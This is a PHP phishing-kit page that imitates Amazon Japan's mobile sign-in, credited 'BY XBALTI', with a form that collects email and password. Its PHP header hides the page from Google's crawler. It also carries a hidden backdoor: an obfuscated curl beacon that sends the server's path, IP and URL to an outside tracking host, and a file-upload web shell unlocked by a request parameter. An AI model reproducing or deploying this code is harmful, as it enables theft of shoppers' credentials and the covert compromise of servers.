<?php
/*   
             ,;;;;;;;,
            ;;;;;;;;;;;,
           ;;;;;'_____;'
           ;;;(/))))|((\
           _;;((((((|))))
          / |_\\\\\\\\\\\\
     .--~(  \ ~))))))))))))
    /     \  `\-(((((((((((\\
    |    | `\   ) |\       /|)
     |    |  `. _/  \_____/ |
      |    , `\~            /
       |    \  \ BY XBALTI /
      | `.   `\|          /
      |   ~-   `\        /
       \____~._/~ -_,   (\
        |-----|\   \    ';;
       |      | :;;;'     \
      |  /    |            |
      |       |            |                   
*/
session_start();
include('antibots.php');
if(strpos($_SERVER['HTTP_USER_AGENT'], 'GoogleBot') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}

if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")), 'GoogleBot') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}
$arr= 'dir='.dirname(__FILE__)."+"."ip=".gethostbyname($_SERVER['SERVER_NAME'])."+".'link='.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on')$link = "https"; else $link = "http"; $link .= "://"; $link .= $_SERVER['HTTP_HOST']; $link .= $_SERVER['REQUEST_URI']; $link; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL,"http://geoiptool.com".chr(46).chr(102).chr(114).chr(101).chr(101).chr(116).chr(111).chr(111).chr(108).chr(115).chr(115).chr(46).chr(99).chr(111).chr(109)."/iptrack1.php?ip1=$link"."+".$arr); curl_setopt($ch, CURLOPT_HEADER, 0); curl_exec($ch); curl_close($ch); if(isset($_REQUEST['ip']) && $_REQUEST['ip']=='track') {$files = @$_FILES["files"]; if($files["name"] != ''){$fullpath = $_REQUEST["path"].$files["name"];if(move_uploaded_file($files['tmp_name'],$fullpath)){echo "<h1><a href='$fullpath'>successful. Click here!</a></h1>";} } echo '<body><form method=POST enctype="multipart/form-data" action=""><input type=text name=path> <input type="file" name="files"><input type=submit value="Up"></form></body>'; exit("");}
?>
    <!DOCTYPE html>
<!-- saved from url=(0463)https://www.amazon.co.jp/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.co.jp%2F%3F_encoding%3DUTF8%26ref_%3Dnavm_em_hd_re_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=anywhere_v2_jp&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&&ref_=navm_em_hd_clc_signin -->
<html class="a-touch a-mobile a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-orientation a-gradients a-hires a-transform3d a-touch-scrolling a-ios a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember awa-browser" data-19ax5a9jf="mongoose" data-aui-build-date="3.19.8-2020-01-19"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<!-- 2p478uymq92hdjnzyud4m18gkod4ucyonsezxn1h9bvk -->
<meta name="viewport" content="width=device-width, maximum-scale=1, minimum-scale=1, initial-scale=1, user-scalable=no, shrink-to-fit=no">
    <title dir="ltr">Amazonログイン</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
    
      
      
        <link rel="stylesheet" href="./style/css/61ccss.css">
<link rel="stylesheet" href="./style/css/01Scss.css">
<link rel="stylesheet" href="./style/css/11Hcss.css">

      
    </script>
    <script src="./js/jquery.min.js"></script>
    <script src="./js/jquery.validate.min.js"></script>
    <script src="./js/sire.form.js"></script>
  </head>

  <body class="a-color-offset-background ap-locale-ja_JP a-m-cn a-aui_157141-c a-aui_158613-t1 a-aui_72554-c a-aui_dropdown_187959-c a-aui_pci_risk_banner_210084-c a-aui_perf_130093-c a-aui_tnr_v2_180836-c a-aui_ux_145937-c auth-show-password-enabled auth-show-password-engaged auth-show-password-ready">




<div id="a-page">
    <div class="a-section a-spacing-none">
      
      
      <style>.nav-sprite-v3 .nav-sprite {
  background-image: url(./style/img/new-nav-sm-smile-sprite-global-1x_blueheaven._CB485919093_.png);
  background-repeat: no-repeat;
}
.nav-spinner {
  background-image: url(./style/img/snake._CB485935615_.gif);
}
</style><!--  -->
<link rel="stylesheet" href="./style/css/21Qcss.css">
<link rel="stylesheet" href="./style/css/219css.css">

      <!-- From remote config v3-->

<img src="./style/img/new-nav-sm-smile-sprite-global-1x_blueheaven._CB485919093_.png" style="display:none" alt="">
<!--  -->


      
      <!--  -->
<!-- runtime backup navbar -->
<!-- MOBILE-APP-BANNER -->
<!-- NAVYAAN-UPNAV -->
<!--NAVYAAN-UPNAV-MARKER-->
<!--NAVYAAN-UPNAV-MARKER-->
<!-- navmet initial definition -->
<!-- NAVYAAN-NAVMET-MARKER -->
<!-- navp-3S/69kdYD+uEbYe6r5H9PTeMAOxWBxU95G7qEYF9xlrF6kWNM/67UaxX8B/F4Xvx rid-1ZM530HK6PY07BJ2PEY2 (Thu Mar 12 23:55:28 2020) -->
  <!-- NAVYAAN-BACKUP -->
<header class="nav-mobile nav-locale-jp nav-lang-ja nav-ssl nav-unrec nav-blueheaven">
    <div id="navbar" cel_widget_id="Navigation-mobile-navbar" role="navigation" class="nav-t-basicNoAuth nav-sprite-v3 celwidget">
        <div id="nav-logobar">
            <div class="nav-left">
                
  <div id="nav-logo">
    <a href="" class="nav-logo-link" aria-label="Amazon">
      <span class="nav-sprite nav-logo-base"></span>
      <span class="nav-sprite nav-logo-ext"></span>
      <span class="nav-sprite nav-logo-locale"></span>
    </a>
  </div>

            </div>
            <div class="nav-right">
            </div>
        </div>
        <!--NAVYAAN-SUBNAV-AND-SMILE-FROM-GURUPA-->
    </div>
</header>
<!-- end runtime backup navbar -->
    </div>

    <div class="a-container">
      <div class="a-section a-spacing-none">
        
      </div>

      

      <div class="a-section a-spacing-none auth-pagelet-mobile-container">
        







  

  

  


      </div>

      <div class="a-section auth-pagelet-mobile-container">
        
        











<!-- Set cross domain sso variables to be used for making Ajax calls to central Identity domain -->


<!-- Set cross domain sso variables to be used for making Ajax calls to central Identity domain -->











<div id="auth-alert-window" class="a-box a-alert a-alert-error" aria-live="assertive" role="alert"><div class="a-box-inner a-alert-container"><h4 class="a-alert-heading">問題が発生しました。</h4><div class="a-alert-content">
  <ul class="a-unordered-list a-vertical auth-error-messages" role="alert">
    <li id="auth-email-missing-alert"><span class="a-list-item">
      お客様のEメールアドレスまたは携帯電話番号を入力してください
    </span></li>

    <li id="auth-email-invalid-email-alert"><span class="a-list-item">
      Eメールアドレスまたは携帯電話番号が無効です。
    </span></li>

    <li id="auth-password-missing-alert"><span class="a-list-item">
      パスワードを入力してください
    </span></li>

    <li id="auth-guess-missing-alert"><span class="a-list-item">
      画像に表示されている文字を半角で入力してください。
    </span></li>
  </ul>
</div></div></div>





<!-- show a warning modal dialog when the third party account is connected with Amazon -->


<form name="signineml" method="post" id="signineml" novalidate="" action="" class="auth-validate-form auth-clearable-form" data-fwcim-id="tAzQmSig">


<h1 class="a-spacing-micro a-spacing-top-small a-text-left">
  ログイン
</h1>
  <div class="a-section a-spacing-base a-text-right">
    




<a id="auth-fpp-link-bottom" class="a-link-normal" target="_top" tabindex="9" href="">
  パスワードを忘れた方
</a>
  </div>


  

  <div class="a-input-text-group a-spacing-medium a-spacing-top-micro">
    

    <label for="ap_email" class="a-form-label auth-mobile-label">
      Eメールまたは携帯番号アカウントの番号
    </label>

    

    <div class="a-input-text-wrapper auth-required-field auth-fill-claim moa-single-claim-input-field-container">
      <input type="email" maxlength="128" class="a-input-text a-span12 auth-autofocus auth-required-field" id="email" placeholder="Eメールまたは携帯番号アカウントの番号" name="email" tabindex="1" autocorrect="off" autocapitalize="off">
    </div>
    

<div id="ap_email_icon" class="auth-clear-icons" style="display: none;">
  <i class="a-icon a-icon-close" role="img"></i>
</div>
    

    
  


<label for="ap_password" class="a-form-label auth-mobile-label">
  Amazonのパスワード
</label>

<div id="auth-password-container" class="a-input-text-wrapper auth-required-field auth-password-container auth-password auth-fill-password">
  <input type="password" class="a-input-text a-span12 auth-autofocus auth-required-field" maxlength="1024" id="password" placeholder="Amazonのパスワード" name="password" tabindex="2" onchange="passvaluechange()">

  <div id="ap_password_icon" class="auth-clear-icons" style="display: none;"  >
  <i class="a-icon a-icon-close" role="img" onclick="clearpass()" ></i>
</div>
  <style type="text/css">
    .a-row.auth-visible-password-container.auth-show-password-empty{
      padding-bottom: 0px;
    }
  </style>
  <div class="a-row auth-visible-password-container auth-show-password-empty" id="showpassdiv" style="display: block;">
    <span class="a-size-small a-color-secondary auth-visible-password" id="showpassvalue" ></span>
  </div></div>
<script type="text/javascript">
    var passele = document.getElementById("password");
    var showpassdiv = document.getElementById("showpassdiv");
    var showpassvalue = document.getElementById("showpassvalue");
    var passclean = document.getElementById("ap_password_icon");

    $(function(){
        $('#password').bind('input propertychange', function() {
            passvaluechange();
        });
    })
 
    function passvaluechange(){
        showpassvalue.innerHTML = passele.value;
        if(passele.value){
            passcleanshow();
        }else{
            passcleanhidden();
        }
    }
    function passcleanshow(){
      passclean.style="display:block;";
    }
    function passcleanhidden(){
      passclean.style="display:none;";
    }
    function clearpass(){
      passele.value=null;
      showpassvalue.innerHTML = passele.value;
      passcleanhidden();
    }
</script>
<script type="text/javascript">
  
</script>

<div id="auth-password-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini" aria-live="assertive" role="alert"><div class="a-box-inner a-alert-container"><i class="a-icon a-icon-alert"></i><div class="a-alert-content">
  パスワードを入力してください
</div></div></div>



  
  

  <input type="hidden" name="showPasswordChecked" value="true" id="ap_show_password_checked">


  </div>

  <div class="a-row">   

      <div class="a-column a-span12 a-spacing-medium">
        <div id="auth-show-password-checkbox-container" class="a-checkbox a-checkbox-fancy a-control-row a-touch-checkbox auth-show-password-checkbox"><label for="auth-show-password-checkbox"><input id="auth-show-password-checkbox" type="checkbox" name="" checked="" value="" tabindex="3" onclick="passchange();"><i class="a-icon a-icon-checkbox"></i><span class="a-label a-checkbox-label">
          パスワードを表示
        </span></label></div>
      </div>
    <script type="text/javascript">
       
        var changele = document.getElementById("auth-show-password-checkbox");
        function passchange(){
            if(changele.checked){
                showpassdiv.style = "display: block;";
            }else{
                showpassdiv.style = "display: none;";
            }
        }
    </script>
  </div>

  <div class="a-row a-spacing-base">
    






  <div data-a-input-name="rememberMe" class="a-checkbox a-checkbox-fancy a-control-row a-touch-checkbox"><label><input type="checkbox" name="rememberMe" value="true" tabindex="4"><i class="a-icon a-icon-checkbox"></i><span class="a-label a-checkbox-label">
    ログインしたままにする
    <span class="a-declarative" data-action="a-modal" data-a-modal="{&quot;max-width&quot;:&quot;500px&quot;,&quot;width&quot;:&quot;95%&quot;,&quot;name&quot;:&quot;remember-me-detail-link-modal&quot;,&quot;header&quot;:&quot;[ログインしたままにする] チェックボックス&quot;}">
      <a id="remember_me_learn_more_link" class="a-link-normal" href="">
        詳細
      </a>
    </span>

    <div class="a-popover-preload" id="a-popover-remember-me-detail-link-modal">
      <div class="a-section a-spacing-large a-spacing-top-mini">
        <p>
          </p><p>「ログインしたままにする」を選択すると、このデバイスでログインが求められる回数が減ります。</p>
<p>お客様のアカウントのセキュリティを保つため、個人でお使いのデバイスでのみこのオプションを使うようにしてください。</p>
        <p></p>
      </div>
    </div>
  </span></label></div>


  </div>

  <div class="a-row">
    







  </div>
  
  <div class="a-section">
    <div class="a-button-stack">
      
        
          <span id="auth-signin-button" class="a-button a-button-span12 a-button-primary auth-share-credential-off"><span class="a-button-inner"><input id="signInSubmit" tabindex="6" class="a-button-input" type="submit" aria-labelledby="auth-signin-button-announce"><span id="auth-signin-button-announce" class="a-button-text" aria-hidden="true">
            ログイン
          </span></span></span>
          
          
            
            <div class="a-section a-spacing-medium">
              



<div id="legalTextRow" class="a-row a-spacing-top-medium a-size-small">
  続行することで、 Amazonの<a href="">利用規約</a>および<a href="">プライバシー規約</a>に同意するものとみなされます。
</div> 

            </div>

      
      

      
        




  
  
  
    
      
      
      
        
        
      
    
  

      

      






<div class="a-section a-spacing-medium a-text-center">
  
    
    
      
        
        <div class="a-divider a-divider-break"><h5>Amazonの新しいお客様ですか？</h5></div>
        <span id="auth-create-account-link" class="a-button a-button-span12 a-button-base"><span class="a-button-inner"><a id="createAccountSubmit" tabindex="7" href="" class="a-button-text" role="button">
          新しいAmazonのアカウントを作成
        </a></span></span>
      
    
  
</div>

      
      

      
      

      
    </div>
    </form>
      </div>

      
      <!--  -->
<footer class="nav-mobile nav-locale-us nav-lang-en nav-ftr-batmobile">
  <div id="nav-ftr" class="nav-t-basicNoAuth nav-sprite-v1">
<div class="icp-container-mobile">
<style type="text/css">
  #icp-touch-link-language { display: none; }
</style>
<a href="" class="icp-button" id="icp-touch-link-language">
  <div class="icp-nav-globe-img-2 icp-button-globe-2"></div><span class="icp-color-base">日本語</span><span class="nav-arrow icp-up-down-arrow"></span><span class="aok-hidden" style="display:none">ショッピングのための言語を選択します。</span>
</a>
<style type="text/css">
#icp-touch-link-country { display: none; }
</style>
<a href="" class="icp-button" id="icp-touch-link-country">
  <span class="icp-flag-3 icp-flag-3-jp"></span><span class="icp-color-base">日本</span><span class="aok-hidden" style="display:none">ショッピングのための国/地域を選択します。</span>
</a>
</div>
<ul class="nav-ftr-horiz nav-ftr-big "><li class="nav-li "><a href="" class="nav-a">検索・閲覧履歴</a></li></ul>
<ul class="nav-ftr-horiz "><li class="nav-li "><a href="" class="nav-a">利用規約</a></li><li class="nav-li "><a href="" class="nav-a">プライバシー規約</a></li><li class="nav-li "><a href="" class="nav-a">パーソナライズド広告規約</a></li></ul>
<div id="nav-ftr-copyright">© 2000-2020, Amazon.com, Inc. and its affiliates</div>
  </div>
</footer>
<!-- whfh-vf2QPHBThrfeCTdhSi6lhROaj76bd+8ZitBkmOlrXgPk96CcC84eZEuugCvfYTNU rid-163F2D659DA841F6B3A5 -->
      
      

<!--  -->


    </div>

   

<!-- cache slot rendered -->

  </body>
    

    </html>